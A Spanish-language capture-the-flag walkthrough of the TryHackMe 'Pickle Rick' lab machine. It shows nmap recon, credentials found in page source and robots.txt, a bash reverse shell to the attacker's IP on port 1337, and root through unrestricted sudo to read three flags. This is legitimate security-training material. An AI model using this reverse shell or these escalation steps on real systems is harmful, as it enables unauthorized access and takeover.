+++
date = "2025-11-17"
title = "TryHackMe - Machine - Pickle Rick v2"
author = "Javier Olmedo"
toc = false
+++

[![/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_banner.png](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_banner.png)](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_banner.png)

¡Buenas, hackers! 👋

Hoy, nos sumergimos en la [máquina Pickle Rick](https://tryhackme.com/room/picklerick) de TryHackMe. Es un desafío clásico de nivel **🟩 Fácil**, perfecto para practicar la enumeración web y la escalada de privilegios básica.

## 🚀 Antes de empezar

**Añadimos** la máquina al archivo `/etc/hosts`, **comprobamos la conexión** con `ping` y **creamos las carpetas de trabajo**

```bash
echo '10.10.34.26\tpicklerick.thm' | sudo tee -a /etc/hosts
ping -c 1 picklerick.thm
mkdir -p ~/thm/picklerick/{exploits,fuzz,http,nmap}
cd ~/thm/picklerick/
```

## 🔎 Reconocimiento

### Escaneo de puertos con Nmap

Comprobamos **todos los puertos** que están **abiertos**, detectamos el servicio y su versión con `nmap` y generamos `all.html` para ver la información.

```bash
nmap -sTCV -p- -Pn -A -T4 --min-rate=1000 -vvv -oA ~/thm/picklerick/nmap/all picklerick.thm
```

```bash
xsltproc ~/thm/picklerick/nmap/all.xml > ~/thm/picklerick/nmap/all.html
```

[![/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_nmap.png](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_nmap.png)](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_nmap.png)

En este punto, observamos que está el puerto `22 (SSH)` y `80 (HTTP)` abiertos.

### 🌐 Inspección del sitio web

Abrimos Firefox para inspeccionar el sitio web.

```bash
firefox http://picklerick.thm &
```

🕵️‍♂️ Puedes encontrar un nombre de usuario en el código fuente.

[![/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_website.png](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_website.png)](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_website.png)

También se encuentra una cadena de texto al revisar el fichero `robots.txt`, lo que podría ser la contraseña del usuario.

```bash
curl http://picklerick.thm/robots.txt
xxxxxxxxxxxxxxxxx
```

## 🚪 Acceso Inicial (Foothold)

Está claro que debe de haber algún tipo de panel de login o similar. Probamos con los típicos `login.php`, `access.php`, etc.

Encontré `login.php`, probamos con las 🔑 credenciales que hemos detectado durante el reconocimiento y **¡Pummmmm estamos dentro!**

[![/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_login.png](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_login.png)](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_login.png)

[![/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_access.png](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_access.png)](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_access.png)

### Obtener shell reversa

Estuve intentando varias cargas, finalmente use el recurso [Revshells](https://www.revshells.com/) para generar una carga en bash.

```bash
bash -c 'bash -i >& /dev/tcp/10.8.95.209/1337 0>&1'
```

[![/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_001.png](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_001.png)](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_001.png)

[![/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_002.png](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_002.png)](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_002.png)

[![/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_003.png](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_003.png)](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_003.png)

## 🧗‍♂️ Escalada de privilegios

Al visualizar la salida de `sudo -l` podemos observar que se puede lanzar cualquier comando como sudo.

```bash
www-data@ip-10-10-34-26:/var/www/html$ sudo -l
Matching Defaults entries for www-data on ip-10-10-34-26:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-34-26:
    (ALL) NOPASSWD: ALL
```

Ahora que somos `root` podemos mostrar el contenido de las **tres flags** en:

- 🥒 1 flag > `cat /var/www/html/Sup3rS3cretPickl3Ingred.txt`
- 🥒 2 flag > `cat /home/rick/'second ingredients'`
- 🥒 3 flag > `sudo cat /root/3rd.txt`

[![/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_complete.png](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_complete.png)](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_complete.png)